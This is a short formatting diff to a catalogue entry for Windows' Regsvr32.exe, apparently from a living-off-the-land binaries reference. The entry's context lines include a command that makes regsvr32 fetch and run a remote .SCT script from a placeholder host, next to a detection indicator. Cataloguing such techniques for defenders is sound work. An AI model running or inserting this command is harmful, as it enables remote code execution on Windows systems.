@@ -2,7 +2,7 @@
 Name: Regsvr32.exe
 Description: Used by Windows to register dlls
 Author: 'Oddvar Moe'
-Created: '2018-05-25'
+Created: 2018-05-25
 Commands:
   - Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
     Description: Execute the specified remote .SCT script with scrobj.dll.
@@ -39,7 +39,7 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\regsvr32.exe
   - Path: C:\Windows\SysWOW64\regsvr32.exe
-Code_Sample: 
+Code_Sample:
 - Code:
 Detection:
  - IOC: regsvr32.exe getting files from Internet
